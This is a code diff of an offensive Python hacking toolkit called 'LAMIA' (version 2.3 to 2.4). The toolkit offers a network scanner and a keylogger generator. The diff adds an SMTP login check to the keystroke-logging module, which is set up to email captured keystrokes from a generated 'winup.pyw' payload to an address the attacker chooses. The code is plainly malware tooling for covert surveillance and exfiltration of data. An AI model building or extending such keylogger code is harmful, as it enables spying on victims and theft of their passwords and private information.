@@ -4,6 +4,7 @@
 import time
 import ctypes
 import sys
+import smtplib
 import os
 import platform
 import socket
@@ -239,7 +240,7 @@ class MainMenu:
 
     def menu(self):
         Clear.clear()
-        print(25 * '-' + f'{Bcolors.Magenta}LAMIA VERSION 2.3{Bcolors.ENDC}' + 25 * '-')
+        print(25 * '-' + f'{Bcolors.Magenta}LAMIA VERSION 2.4{Bcolors.ENDC}' + 25 * '-')
         time.sleep(0.25)
         print(f'{Bcolors.WARNING}1.NETWORK SCANNER{Bcolors.ENDC}')
         time.sleep(0.25)
@@ -2658,6 +2659,16 @@ def KeyStroke(event):
             sender_email = str(input())
             print('Write password of this email: ', end='')
             key_password = str(input())
+            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+            try:
+                server.login(f'{sender_email}', f'{key_password}')
+            except smtplib.SMTPAuthenticationError:
+                print(f'{Bcolors.Error}ERROR!{Bcolors.ENDC} Wrong Credentials!')
+                server.quit()
+                os.remove(rf'C:\Users\{self.user_name}\Desktop\winup.pyw')
+                time.sleep(2)
+                MainMenu().menu()
+            server.quit()
             print('Here write email name where script will send data: ', end='')
             key_send_to_email = str(input())
             print(
@@ -2810,4 +2821,4 @@ if __name__ == '__main__':
         if os.name == 'nt':
             subprocess.call('pip install elevate', stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
 
-# VERSION 2.3
+# VERSION 2.4
